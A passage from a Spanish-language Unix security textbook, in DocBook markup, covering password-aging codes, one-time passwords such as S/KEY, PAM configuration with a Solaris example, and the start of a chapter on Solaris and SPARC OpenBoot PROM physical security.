 align="center"><para>15</para></entry>
 </row><row><entry 
 align="center"><para>      Car&#x00E1;cter      </para></entry><entry 
 align="center"><para>D</para></entry><entry 
 align="center"><para>E</para></entry><entry 
 align="center"><para>F </para></entry><entry 
 align="center"><para>G</para></entry><entry 
 align="center"><para>H</para></entry><entry 
 align="center"><para> I </para></entry><entry 
 align="center"><para>J </para></entry><entry 
 align="center"><para>K</para></entry><entry 
 align="center"><para>L </para></entry><entry 
 align="center"><para>M</para></entry><entry 
 align="center"><para>N</para></entry><entry 
 align="center"><para>O</para></entry><entry 
 align="center"><para>P</para></entry><entry 
 align="center"><para>Q</para></entry><entry 
 align="center"><para>R</para></entry>
 </row><row><entry 
 align="center"><para>Valor (semanas)</para></entry><entry 
 align="center"><para>16</para></entry><entry 
 align="center"><para>17</para></entry><entry 
 align="center"><para>18</para></entry><entry 
 align="center"><para>19</para></entry><entry 
 align="center"><para>20</para></entry><entry 
 align="center"><para>21</para></entry><entry 
 align="center"><para>21</para></entry><entry 
 align="center"><para>22</para></entry><entry 
 align="center"><para>23</para></entry><entry 
 align="center"><para>24</para></entry><entry 
 align="center"><para>25</para></entry><entry 
 align="center"><para>26</para></entry><entry 
 align="center"><para>27</para></entry><entry 
 align="center"><para>28</para></entry><entry 
 align="center"><para>29</para></entry>
 </row><row><entry 
 align="center"><para>      Car&#x00E1;cter      </para></entry><entry 
 align="center"><para>S </para></entry><entry 
 align="center"><para>T</para></entry><entry 
 align="center"><para>U</para></entry><entry 
 align="center"><para>V</para></entry><entry 
 align="center"><para>W</para></entry><entry 
 align="center"><para>X</para></entry><entry 
 align="center"><para>Y</para></entry><entry 
 align="center"><para>Z </para></entry><entry 
 align="center"><para>a </para></entry><entry 
 align="center"><para>b </para></entry><entry 
 align="center"><para> c </para></entry><entry 
 align="center"><para>d </para></entry><entry 
 align="center"><para> e </para></entry><entry 
 align="center"><para> f </para></entry><entry 
 align="center"><para>g </para></entry>
 </row><row><entry 
 align="center"><para>Valor (semanas)</para></entry><entry 
 align="center"><para>30</para></entry><entry 
 align="center"><para>31</para></entry><entry 
 align="center"><para>32</para></entry><entry 
 align="center"><para>33</para></entry><entry 
 align="center"><para>34</para></entry><entry 
 align="center"><para>35</para></entry><entry 
 align="center"><para>36</para></entry><entry 
 align="center"><para>37</para></entry><entry 
 align="center"><para>38</para></entry><entry 
 align="center"><para>39</para></entry><entry 
 align="center"><para>40</para></entry><entry 
 align="center"><para>41</para></entry><entry 
 align="center"><para>42</para></entry><entry 
 align="center"><para>43</para></entry><entry 
 align="center"><para>44</para></entry>
 </row><row><entry 
 align="center"><para>      Car&#x00E1;cter      </para></entry><entry 
 align="center"><para>h </para></entry><entry 
 align="center"><para> i </para></entry><entry 
 align="center"><para> j </para></entry><entry 
 align="center"><para>k </para></entry><entry 
 align="center"><para> l </para></entry><entry 
 align="center"><para>m</para></entry><entry 
 align="center"><para>n </para></entry><entry 
 align="center"><para>o </para></entry><entry 
 align="center"><para>p </para></entry><entry 
 align="center"><para>q </para></entry><entry 
 align="center"><para> r </para></entry><entry 
 align="center"><para> s </para></entry><entry 
 align="center"><para> t </para></entry><entry 
 align="center"><para>u </para></entry><entry 
 align="center"><para>v </para></entry>
 </row><row><entry 
 align="center"><para>Valor (semanas)</para></entry><entry 
 align="center"><para>45</para></entry><entry 
 align="center"><para>46</para></entry><entry 
 align="center"><para>47</para></entry><entry 
 align="center"><para>48</para></entry><entry 
 align="center"><para>49</para></entry><entry 
 align="center"><para>50</para></entry><entry 
 align="center"><para>51</para></entry><entry 
 align="center"><para>52</para></entry><entry 
 align="center"><para>53</para></entry><entry 
 align="center"><para>54</para></entry><entry 
 align="center"><para>55</para></entry><entry 
 align="center"><para>56</para></entry><entry 
 align="center"><para>57</para></entry><entry 
 align="center"><para>58</para></entry><entry 
 align="center"><para>59</para></entry>
 </row><row><entry 
 align="center"><para>      Car&#x00E1;cter      </para></entry><entry 
 align="center"><para>w</para></entry><entry 
 align="center"><para>x </para></entry><entry 
 align="center"><para>y </para></entry><entry 
 align="center"><para> z </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry>
 </row><row><entry 
 align="center"><para>Valor (semanas)</para></entry><entry 
 align="center"><para>60</para></entry><entry 
 align="center"><para>61</para></entry><entry 
 align="center"><para>62</para></entry><entry 
 align="center"><para>63</para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry><entry 
 align="center"><para>  </para></entry>
 </row><row><entry 
 align="center"><para>                     </para></entry>
 </row></tbody></tgroup></informaltable></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1270032"  ></anchor>Cuadro&#x00A0;8.2</title><para>C&#x00F3;digos de caracteres para el envejecimiento de contrase~nas.</para></blockquote>
<!--l. 936--><para>En este caso el primer car&#x00E1;cter tras la coma es el n&#x00FA;mero m&#x00E1;ximo de semanas antes de que el password expire; el
siguiente car&#x00E1;cter es el n&#x00FA;mero m&#x02CA;&#x0131;nimo de semanas antes de que el usuario pueda cambiar su clave, y el
tercer y cuarto car&#x00E1;cter indican el tiempo transcurrido desde el 1 de enero de 1970 hasta el &#x00FA;ltimo cambio de
contrase~na. Todos estos tiempos se indican mediante determinados caracteres con un signi&#xFB01;cado especial,
mostrados en la tabla  <ulink 
  url="#x1-1270032"  ><!--ref: agingcodes--></ulink>. Tambi&#x00E9;n se contemplan en este esquema tres casos especiales: si los dos primeros
caracteres son &#x2018;..&#x2019; el usuario ser&#x00E1; obligado a cambiar su clave la siguiente vez que conecte al sistema;
el programa passwd modi&#xFB01;car&#x00E1; entonces su entrada en el archivo para que el usuario no se
vuelva a ver afectado por el envejecimiento. Otro caso especial ocurre cuando los dos &#x00FA;ltimos
caracteres tambi&#x00E9;n son &#x2018;..&#x2019;, situaci&#x00F3;n en la cual el usuario igualmente se ver&#x00E1; obligado a cambiar su
clave la pr&#x00F3;xima vez que conecte al sistema pero el envejecimiento seguir&#x00E1; de&#xFB01;nido por los dos
primeros caracteres. Por &#x00FA;ltimo, si el primer car&#x00E1;cter tras la coma es menor que el siguiente, el
usuario no puede cambiar su password nunca, y s&#x00F3;lo puede ser modi&#xFB01;cado a trav&#x00E9;s de la cuenta
root.
  </para></section><!--end subsubsection--><!--l. 953--><section 
role="subsubsection"><title><anchor 
   id="x1-1280008.5.2"  ></anchor>Claves de un solo uso</title>
<!--l. 954--><para>  El envejecimiento de contrase~nas tiene dos casos extremos. Por un lado, tenemos el esquema cl&#x00E1;sico: una
clave es v&#x00E1;lida hasta que el usuario voluntariamente decida cambiarla (es decir, no hay caducidad de la
contrase~na). El extremo contrario del Aging Password es otorgar un tiempo de vida m&#x02CA;&#x0131;nimo a cada clave,
de forma que s&#x00F3;lo sirva para una conexi&#x00F3;n: es lo que se denomina clave de un solo uso, One Time Password
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->&#x00BF;C&#x00F3;mo utilizar contrase~nas de un s&#x00F3;lo uso? Para conseguirlo existen diferentes aproximaciones; la
m&#x00E1;s simplista consiste en asignar al usuario una lista en papel con la secuencia de claves a
utilizar, de forma que cada vez que &#x00E9;ste conecte al sistema elimina de la lista la contrase~na que
acaba de utilizar. Por su parte, el sistema avanza en su registro para que la pr&#x00F3;xima vez que el
usuario conecte pueda utilizar la siguiente clave. Otra aproximaci&#x00F3;n consiste en utilizar un
peque~no dispositivo que el usuario debe llevar consigo, como una tarjeta o una calculadora
especial, de forma que cuando desee conectar el sistema le indicar&#x00E1; una secuencia de caracteres a
teclear en tal dispositivo; el resultado obtenido ser&#x00E1; lo que se ha de utilizar como password.
Para incrementar la seguridad ante un robo de la tarjeta, antes de teclear el n&#x00FA;mero recibido
desde la m&#x00E1;quina suele ser necesario utilizar un P.I.N. que el usuario debe mantener en secreto
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->Una de las implementaciones del One Time Password m&#x00E1;s extendida entre los diferentes clones de Unix es
S/KEY (<citation>[?]</citation>), disponible tambi&#x00E9;n para clientes Windows y MacOS. Utilizando este software, la clave de
los usuarios no viaja nunca por la red, ni siquiera al ejecutar &#x00F3;rdenes como su o passwd, ni

tampoco se almacena informaci&#x00F3;n comprometedora (como las claves en claro) en la m&#x00E1;quina
servidora. Cuando el cliente desea conectar contra un sistema genera una contrase~na de un solo
uso, que se veri&#xFB01;ca en el servidor; en ambas tareas se utilizan las funciones resumen MD4
(<citation>[?]</citation>) o MD5 (<citation>[?]</citation>). Para realizar la autenticaci&#x00F3;n, la m&#x00E1;quina servidora guarda una copia del
password que recibe del cliente y le aplica la funci&#x00F3;n resumen; si el resultado no coincide con
la copia guardada en el &#xFB01;chero de contrase~nas, se deniega el acceso. Si por el contrario la
veri&#xFB01;caci&#x00F3;n es correcta se actualiza la entrada del usuario en el archivo de claves con el one time
password que se ha recibido (antes de aplicarle la funci&#x00F3;n), avanzando as&#x02CA;&#x0131; en la secuencia de
contrase~nas. Este avance decrementa en uno el n&#x00FA;mero de iteraciones de la funci&#x00F3;n ejecutadas,
por lo que ha de llegar un momento en el que el usuario debe reiniciar el contador o en caso
contrario se le negar&#x00E1; el acceso al sistema; para ello ejecuta una versi&#x00F3;n modi&#xFB01;cada de la orden
passwd.
  </para></section><!--end subsubsection--><!--l. 995--><section 
role="subsubsection"><title><anchor 
   id="x1-1290008.5.2"  ></anchor>Otros m&#x00E9;todos</title>
<!--l. 996--><para>  Algo por lo que se ha criticado el esquema de autenticaci&#x00F3;n de usuarios de Unix es la longitud &#x2013; para
prop&#x00F3;sitos de alta seguridad, demasiado corta &#x2013; de sus claves; lo que hace a~nos era poco m&#x00E1;s que un
planteamiento te&#x00F3;rico (<citation>[?]</citation>), actualmente es algo factible: sin ni siquiera entrar en temas de hardware
dedicado, seguramente demasiado caro para la mayor&#x02CA;&#x0131;a de atacantes, con un supercomputador es posible
romper claves de Unix en menos de dos d&#x02CA;&#x0131;as (<citation>[?]</citation>).
<!--br/-->
<!--br/-->Un m&#x00E9;todo que aumenta la seguridad de nuestras claves frente a ataques de intrusos es el cifrado
mediante la funci&#x00F3;n conocida como bigcrypt() o crypt16(), que permite longitudes para las
claves y los salts m&#x00E1;s largas que crypt(3); sin embargo, aunque se aumenta la seguridad de las
claves, el problema que se presenta aqu&#x02CA;&#x0131; es la incompatibilidad con las claves del resto de
Unices que sigan utilizando crypt(3); este es un problema com&#x00FA;n con otras aproximaciones (<citation>[?]</citation>,
<citation>[?]</citation>&#x2026;) que tambi&#x00E9;n se basan en modi&#xFB01;car el algoritmo de cifrado, cuando no en utilizar uno
nuevo.
  </para></section><!--end subsubsection--></section><!--end subsection--></section><!--end section--><!--l. 1012--><section 
role="section"><title><abbrev role="title-mark">8.6</abbrev><anchor 
   id="x1-1300008.6"  ></anchor>PAM</title>
<!--l. 1013--><para>  PAM (Pluggable Authentication Module) no es un modelo de autenticaci&#x00F3;n en s&#x02CA;&#x0131;, sino que se trata de un
mecanismo que proporciona una interfaz entre las aplicaciones de usuario y diferentes m&#x00E9;todos de
autenticaci&#x00F3;n, trantado de esta forma de solucionar uno de los problemas cl&#x00E1;sicos de la autenticaci&#x00F3;n de
usuarios: el hecho de que una vez que se ha de&#xFB01;nido e implantado cierto mecanismo en un entorno, es
dif&#x02CA;&#x0131;cil cambiarlo. Mediante PAM podemos comunicar a nuestra aplicaciones con los m&#x00E9;todos de
autenticaci&#x00F3;n que deseemos de una forma transparente, lo que permite integrar las utilidades de un sistema
Unix cl&#x00E1;sico (login, ftp, telnet&#x2026;) con esquemas diferentes del habitual password: claves de un solo uso,
biom&#x00E9;tricos, tarjetas inteligentes&#x2026;
<!--br/-->
<!--br/-->PAM viene &#x2018;de serie&#x2019; en diferentes sistemas Unix, tanto libres como comerciales (Solaris, FreeBSD, casi
todas las distribuciones de Linux&#x2026;), y el nivel de abstracci&#x00F3;n que proporciona permite cosas tan
interesantes como kerberizar nuestra autenticaci&#x00F3;n (al menos la parte servidora) sin m&#x00E1;s que
cambiar la con&#xFB01;guraci&#x00F3;n de PAM, que se encuentra bien en el &#xFB01;chero /etc/pam.conf o bien en
diferentes archivos dentro del directorio /etc/pam.d/; en el primero de los dos casos, por
ejemplo en Solaris, el &#xFB01;chero de con&#xFB01;guraci&#x00F3;n de PAM est&#x00E1; formado por l&#x02CA;&#x0131;neas de la siguiente
forma:
     </para><!--l. 1034--><para>servicio tipo control ruta<informalequation><graphic 
fileref="unixsec68x.gif"></graphic></informalequation>m&#x00F3;dulo argumentos<informalequation><graphic 
fileref="unixsec69x.gif"></graphic></informalequation>m&#x00F3;dulo
</para><!--l. 1036--><para>El campo &#x2018;servicio&#x2019; indica obviamente el nombre del servicio sobre el que se va a aplicar la autenticaci&#x00F3;n
(ftp, telnet, dtlogin, passwd&#x2026;), y el campo &#x2018;tipo&#x2019; de&#xFB01;ne el tipo de servicio sobre el que se aplica el
m&#x00F3;dulo; PAM de&#xFB01;ne cuatro posibles valores para este campo (<citation>[?]</citation>):

     </para><itemizedlist>
     <listitem>
     <!--l. 1042--><para>account
     <!--br/-->Determina si el usuario est&#x00E1; autorizado a acceder al servicio indicado, por ejemplo si su clave
     ha caducado, si el acceso se produce desde una l&#x02CA;&#x0131;nea determinada o si se supera el n&#x00FA;mero
     m&#x00E1;ximo de conexiones simult&#x00E1;neas.
     </para></listitem>
     <listitem>
     <!--l. 1046--><para>auth
     <!--br/-->Determina si el usuario es autenticado correctamente, por ejemplo mediante una clave cl&#x00E1;sica
     de Unix o mediante un m&#x00E9;todo biom&#x00E9;trico.
     </para></listitem>
     <listitem>
     <!--l. 1049--><para>password
     <!--br/-->Proporciona  mecanismos  para  que  el  usuario  actualice  su  elemento  de  autenticaci&#x00F3;n,  por
     ejemplo para cambiar su contrase~na de acceso al sistema.
     </para></listitem>
     <listitem>
     <!--l. 1052--><para>session
     <!--br/-->De&#xFB01;ne procesos a ejecutar antes o despu&#x00E9;s de autenticar al usuario, como registrar el evento o
     activar un mecanismo de monitorizaci&#x00F3;n concreto.</para></listitem></itemizedlist>
<!--l. 1056--><para>Por su parte, el campo al que hemos etiquetado como &#x2018;control&#x2019; marca qu&#x00E9; hacer ante el &#x00E9;xito o el fracaso del
m&#x00F3;dulo al que afecten; los m&#x00F3;dulos PAM son apilables, esto es, podemos combinar un n&#x00FA;mero
indeterminado de ellos (del mismo tipo) para un &#x00FA;nico servicio de forma que si uno de ellos falla la
autenticaci&#x00F3;n es incorrecta, si uno de ellos es correcto no nos preocupamos del resto, si algunos
son necesarios pero otros no para una correcta autenticaci&#x00F3;n, etc. Se de&#xFB01;nen cuatro tipos de
control:
     </para><itemizedlist>
     <listitem>
     <!--l. 1064--><para>required
     <!--br/-->El resultado del m&#x00F3;dulo ha de ser exitoso para que se proporcione acceso al servicio; si falla, el
     resto de m&#x00F3;dulos de la pila se ejecutan, pero sin importar su resultado el acceso ser&#x00E1; denegado.
     </para></listitem>
     <listitem>
     <!--l. 1068--><para>requisite
     <!--br/-->De nuevo, el resultado del m&#x00F3;dulo ha de ser exitoso para que se proporcione acceso al servicio;
     en caso contrario, no se ejecutan m&#x00E1;s m&#x00F3;dulos y el acceso se deniega inmediatamente.
     </para></listitem>
     <listitem>
     <!--l. 1072--><para>sufficient
     <!--br/-->Si la ejecuci&#x00F3;n el m&#x00F3;dulo correspondiente tiene &#x00E9;xito el acceso se permite inmediatamente (sin
     ejecutar el resto de m&#x00F3;dulos para el mismo servicio) siempre y cuando no haya fallado antes
     un m&#x00F3;dulo cuyo tipo de control sea &#x2018;required&#x2019;; si la ejecuci&#x00F3;n es incorrecta, no se implica
     necesariamente una negaci&#x00F3;n de acceso.
     </para></listitem>
     <listitem>
     <!--l. 1078--><para>optional
     <!--br/-->El resultado de su ejecuci&#x00F3;n no es cr&#x02CA;&#x0131;tico para determinar el acceso al servicio requerido: si
     falla, pero otro m&#x00F3;dulo del mismo tipo para el servicio es exitoso, se permite el acceso. S&#x00F3;lo
     es signi&#xFB01;cativo si se trata del &#x00FA;nico m&#x00F3;dulo de su tipo para un cierto servicio, en cuyo caso el
     acceso al servicio se permite o deniega en funci&#x00F3;n de si la ejecuci&#x00F3;n del m&#x00F3;dulo tiene &#x00E9;xito.</para></listitem></itemizedlist>

<!--l. 1086--><para>Finalmente, el campo &#x2018;ruta<informalequation><graphic 
fileref="unixsec70x.gif"></graphic></informalequation>modulo&#x2019; marca el nombre del m&#x00F3;dulo o la ruta donde est&#x00E1; &#x00FA;bicado el &#xFB01;chero,
mientras que &#x2018;argumentos<informalequation><graphic 
fileref="unixsec71x.gif"></graphic></informalequation>modulo de&#xFB01;ne los argumentos que se le han de pasar cuando se invoca; este
&#x00FA;ltimo es el &#x00FA;nico campo opcional del &#xFB01;chero.
<!--br/-->
<!--br/-->En el caso de que la con&#xFB01;guraci&#x00F3;n de PAM se distribuya en diferentes &#xFB01;cheros dentro del directorio
/etc/pam.d/ (generalmente implementaciones m&#x00E1;s modernas, como las de Linux), el nombre de cada
&#xFB01;chero marca el servicio al que afecta la autenticaci&#x00F3;n (es decir, encontraremos un archivo llamado
&#x2018;telnet&#x2019;, otro llamado &#x2018;ftp&#x2019;, etc.), de forma que las l&#x02CA;&#x0131;neas de cada &#xFB01;chero &#x00FA;nicamente tienen los cuatro
&#x00FA;ltimos campos de los comentados aqu&#x02CA;&#x0131;.
<!--br/-->
<!--br/-->Veamos un ejemplo: la autenticaci&#x00F3;n de&#xFB01;nida para el servicio &#x2018;login&#x2019; en un sistema Solaris; el &#xFB01;chero
/etc/pam.conf contendr&#x00E1; l&#x02CA;&#x0131;neas como las siguientes:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;grep&#x00A0;&#x02C6;login&#x00A0;/etc/pam.conf
&#x00A0;login&#x00A0;&#x00A0;&#x00A0;auth&#x00A0;required&#x00A0;&#x00A0;&#x00A0;/usr/lib/security/$ISA/pam&#x005F;unix.so.1
&#x00A0;login&#x00A0;&#x00A0;&#x00A0;auth&#x00A0;required&#x00A0;&#x00A0;&#x00A0;/usr/lib/security/$ISA/pam&#x005F;dial&#x005F;auth.so.1
&#x00A0;login&#x00A0;&#x00A0;&#x00A0;account&#x00A0;requisite&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/security/$ISA/pam&#x005F;roles.so.1
&#x00A0;login&#x00A0;&#x00A0;&#x00A0;account&#x00A0;required&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/lib/security/$ISA/pam&#x005F;unix.so.1
&#x00A0;anita:/#
</literallayout>
<!--l. 1110--><para>La primera l&#x02CA;&#x0131;nea indica que cuando un usuario desee autenticarse contra el servicio de &#x2018;login&#x2019;, ha de
ejecutar correctamente el m&#x00F3;dulo pam<informalequation><graphic 
fileref="unixsec72x.gif"></graphic></informalequation>unix, el principal de Solaris, que proporciona funcionalidad para los
cuatro tipos de servicio de los que hemos hablado; como en este caso el tipo es &#x2018;auth&#x2019;, lo que hace
el m&#x00F3;dulo es comparar la clave introducida por el usuario con la que existe en el archivo de
contrase~nas de la m&#x00E1;quina, autentic&#x00E1;ndolo si coinciden. Evidentemente, el control es de tipo
&#x2018;required&#x2019;, lo que viene a decir que el password tecleado ha de ser el correcto para poder
autenticarse contra el sistema; algo parecido sucede con la segunda l&#x02CA;&#x0131;nea, que invoca al m&#x00F3;dulo
pam<informalequation><graphic 
fileref="unixsec73x.gif"></graphic></informalequation>dial<informalequation><graphic 
fileref="unixsec74x.gif"></graphic></informalequation>auth, encargado de validar la l&#x02CA;&#x0131;nea de conexi&#x00F3;n y las claves de dialup en Solaris, si
los archivos /etc/dialups y /etc/d<informalequation><graphic 
fileref="unixsec75x.gif"></graphic></informalequation>passwd existen. Si cualquiera de los m&#x00F3;dulos devolviera
un c&#x00F3;digo de ejecuci&#x00F3;n incorrecta, el acceso al servicio de login &#x2013; el acceso a la m&#x00E1;quina &#x2013; se
denegar&#x02CA;&#x0131;a.
<!--br/-->
<!--br/-->Las dos l&#x02CA;&#x0131;neas siguientes se utilizan para la gesti&#x00F3;n de las claves de usuario, tambi&#x00E9;n para el control de acceso
al servicio &#x2018;login&#x2019;; el m&#x00F3;dulo pam<informalequation><graphic 
fileref="unixsec76x.gif"></graphic></informalequation>roles comprueba que el usuario que ejecuta el proceso est&#x00E1; autorizado a
asumir el rol del usuario que quiere autenticarse, mientras que pam<informalequation><graphic 
fileref="unixsec77x.gif"></graphic></informalequation>unix, del que ya hemos hablado, lo que
hace ahora que el tipo de servicio es &#x2018;account&#x2019; es simplemente veri&#xFB01;car que el password del usuario no ha
caducado. El tipo de control en el primer caso es &#x2018;requisite&#x2019;, lo que implica que si el m&#x00F3;dulo falla
directamente se niega el acceso y no se ejecuta el m&#x00F3;dulo pam<informalequation><graphic 
fileref="unixsec78x.gif"></graphic></informalequation>unix; si el primero no falla, s&#x02CA;&#x0131; que se
ejecuta este &#x00FA;ltimo, y su resultado ha de ser correcto para permitir el acceso (algo por otra parte
evidente).
<!--br/-->
<!--br/-->La arquitectura PAM ha venido a solucionar diferentes problemas hist&#x00F3;ricos de la autenticaci&#x00F3;n de usuarios
en entornos Unix &#x2013; especialmente en entornos complejos, como sistemas distribuidos o reinos Kerberos;
proporciona una independencia entre los servicios del sistema y los mecanismos de autenticaci&#x00F3;n utilizados,
bene&#xFB01;ciando tanto al usuario como a los administradores Unix. Desde 1995, a~no en que se adopt&#x00F3; la soluci&#x00F3;n
propuesta por Sun Microsystems hasta la actualidad, cada vez m&#x00E1;s plataformas integran PAM por
defecto, con lo que se ha convertido en el est&#x00E1;ndar de facto en la autenticaci&#x00F3;n dentro de entornos
Unix.


</para><!--l. 1--><para>

</para><!--l. 1--><para>

</para><!--l. 1--><para>

  </para></section><!--end section--><!--l. 1--><section 
role="part"><title><anchor 
   id="x1-131000III"  ></anchor>Algunos sistemas Unix</title>

<!--l. 87--><para>


</para><!--l. 1--><para>

  </para></section><!--end part--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-1320009"  ></anchor>Solaris</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">9.1</abbrev><anchor 
   id="x1-1330009.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  Solaris es el nombre del actual entorno de trabajo Unix desarrollado por Sun Microsystems; con anterioridad
esta compa~n&#x02CA;&#x0131;a ofrec&#x02CA;&#x0131;a SunOS, un sistema basado en BSD, pero a partir de su versi&#x00F3;n 5 el sistema fu&#x00E9;
completamente revisado, adopt&#x00F3; el modelo System V y se pas&#x00F3; a denominar Solaris, que es como se conoce
actualmente <anchor 
   id="x1-133001f1"  ></anchor><footnote><para>     Realmente, existi&#x00F3; un entorno llamado Solaris 1.x, que no era m&#x00E1;s que alguna versi&#x00F3;n de SunOS 4 acompa~nada de
OpenWindows 3.0 (<citation>[?]</citation>).</para></footnote>.
Hasta la versi&#x00F3;n 6, el producto era conocido como &#x2018;Solaris 2.x&#x2019; &#x2013; equivalentemente, &#x2018;SunOS 5.x&#x2019; &#x2013;, pero
desde su versi&#x00F3;n 7 se elimin&#x00F3; el &#x2018;2.x&#x2019; y simplemente se pas&#x00F3; a llamar &#x2018;Solaris x&#x2019;, aunque se sigue manteniendo
el nombre &#x2018;SunOS 5.x&#x2019;; en la actualidad, Sun Microsystems ofrece Solaris 8, y se espera que en 2001
aparezca en el mercado Solaris 9.
<!--br/-->
<!--br/-->Solaris es uno de los Unix m&#x00E1;s extendidos hoy en d&#x02CA;&#x0131;a, ya que sus posibilidades comprenden un abanico muy
amplio; aunque funciona sobre arquitecturas x86 (lo que permite que cualquiera pueda instalar y utilizar el
operativo en un PC casero), el principal mercado de Solaris est&#x00E1; en las estaciones y los servidores SPARC
(Scalable Processor ARChitecture). Dentro de esta familia de procesadores podemos encontrar todo tipo de
m&#x00E1;quinas, desde estaciones que pueden ser equivalentes en potencia a un PC (como la UltraSPARC 5) a
grandes servidores (por ejemplo, los Ultra Enterprise 10000), pasando por supuesto por servidores medios,
como los Ultra Enterprise 3500; esta amplia gama de m&#x00E1;quinas hace que Solaris se utilice en todo tipo de
aplicaciones, desde equipos de sobremesa o servidores web sencillos hasta sistemas de bases
de datos de alta disponibilidad. Su uso como plataforma de aplicaciones relacionadas con la
seguridad (t&#x02CA;&#x0131;picamente, sistemas cortafuegos funcionando con Firewall&#x2013;1) tambi&#x00E9;n est&#x00E1; muy
extendido.
<!--br/-->
<!--br/-->Para conocer m&#x00E1;s el entorno de trabajo Solaris podemos descargar las im&#x00E1;genes del operativo, tanto para
arquitecturas SPARC como para x86, y de forma completamente gratuita, desde la web corporativa de Sun
Microsystems: http://www.sun.com/. Tambi&#x00E9;n podemos obtener documentaci&#x00F3;n de casi cualquier tema
relacionado con Solaris en la direcci&#x00F3;n http://docs.sun.com/, o consultar los BluePrints que la compa~n&#x02CA;&#x0131;a
publica peri&#x00F3;dicamente en http://www.sun.com/blueprints/. Existen adem&#x00E1;s numerosas publicaciones
relacionadas con diversos aspectos de Solaris: por ejemplo, de su seguridad se habla en <citation>[?]</citation>, y de su dise~no
interno en <citation>[?]</citation>; sus aspectos gen&#x00E9;ricos de uso o administraci&#x00F3;n se pueden consultar en cualquier libro de Unix,
aunque en muchas ocasiones uno se pregunta si vale la pena realmente comprar algunos libros cuando en
Internet tenemos a nuestra disposici&#x00F3;n cientos y cientos de hojas de magn&#x02CA;&#x0131;&#xFB01;ca documentaci&#x00F3;n sobre
Solaris.
<!--br/-->
<!--br/-->Tal y como se instala por defecto, Solaris &#x2013; como la mayor&#x02CA;&#x0131;a de operativos &#x2013; no es un sistema
especialmente seguro; es necesario dedicar un m&#x02CA;&#x0131;nimo de tiempo a retocar y personalizar algunos aspectos
de su con&#xFB01;guraci&#x00F3;n: tras estos peque~nos detalles, un servidor puede pasar a trabajar directamente en
explotaci&#x00F3;n con un nivel de seguridad m&#x00E1;s que aceptable. En este cap&#x02CA;&#x0131;tulo vamos a hablar de aspectos de
con&#xFB01;guraci&#x00F3;n, de software, de procedimientos de trabajo&#x2026;aplicables en Solaris; aunque evidentemente los
aspectos de los que hemos venido hablando durante todo el trabajo se pueden &#x2013; y deben &#x2013; aplicar en
este sistema operativo, aqu&#x02CA;&#x0131; entraremos algo m&#x00E1;s a fondo en algunos aspectos particulares de
Solaris.
  </para></section><!--end section--><!--l. 56--><section 
role="section"><title><abbrev role="title-mark">9.2</abbrev><anchor 
   id="x1-1340009.2"  ></anchor>Seguridad f&#x02CA;&#x0131;sica en SPARC</title>
<!--l. 57--><para>  Los mecanismos de seguridad de m&#x00E1;s bajo nivel que ofrece Solaris sobre estaciones y servidores SPARC son
los que estos implantan en su EEPROM, una memoria RAM no vol&#x00E1;til (NVRAM, Non&#x2013;volatile RAM) a la
que se puede acceder pulsando las teclas &#x2018;Stop&#x2013;A&#x2019; (teclados Sun) o &#x2018;Ctrl&#x2013;Break&#x2019; (terminales serie). Esta
memoria, tambi&#x00E9;n denominada OpenBoot PROM o simplemente OBP es en muchos aspectos similar a la
BIOS de un simple PC, pero mucho m&#x00E1;s potente y &#xFB02;exible; sus funciones son veri&#xFB01;car el estado del hardware
e inicializarlo (ofreciendo para ello una amplica gama de herramientas empotradas), y por supuesto
arrancar el sistema operativo.
<!--br/-->
<!--br/-->Como antes hemos dicho, cualquiera con acceso f&#x02CA;&#x0131;sico a una m&#x00E1;quina SPARC puede interactuar

con su NVRAM sin m&#x00E1;s que pulsar la combinaci&#x00F3;n de teclas &#x2018;Stop&#x2013;A&#x2019;; sin importar el estado en
que se encuentre el sistema, autom&#x00E1;ticamente se detendr&#x00E1;n todos los procesos en ejecuci&#x00F3;n y
se mostrar&#x00E1; en consola el prompt &#x2018;ok &#x2019;, que indica que podemos comenzar a teclear &#x00F3;rdenes
de la OBP. La m&#x00E1;quina no pierde en ning&#x00FA;n momento su estado a no ser que expl&#x02CA;&#x0131;citamente
la detengamos: al salir de la OBP podemos continuar la ejecuci&#x00F3;n de todos los procesos que
ten&#x02CA;&#x0131;amos al entrar, desde el mismo punto en que los detuvimos y con el mismo entorno que
pose&#x02CA;&#x0131;an, pero mientras estemos interactuando con la EEPROM ning&#x00FA;n proceso avanzar&#x00E1; en su
ejecuci&#x00F3;n.
<!--br/-->
<!--br/-->Al interactuar con la EEPROM, cualquier persona <anchor 
   id="x1-134001f2"  ></anchor><footnote><para>     Recordemos, con acceso f&#x02CA;&#x0131;sico a la m&#x00E1;quina.</para></footnote>
puede interrumpir al operativo y rearrancarlo desde un disco, un CD&#x2013;ROM, o un sistema remoto, lo que
evidentemente le proporciona un control total sobre el sistema; podemos deshabilitar la funci&#x00F3;n de las teclas
&#x2018;Stop&#x2013;A&#x2019; mediante la directiva del kernel &#x2018;abort<informalequation><graphic 
fileref="unixsec81x.gif"></graphic></informalequation>enable&#x2019; en el &#xFB01;chero /etc/system, o &#x2013; lo que suele ser
m&#x00E1;s &#x00FA;til &#x2013; proteger mediante contrase~na el reinicio de una m&#x00E1;quina desde su memoria NVRAM. Para ello, las
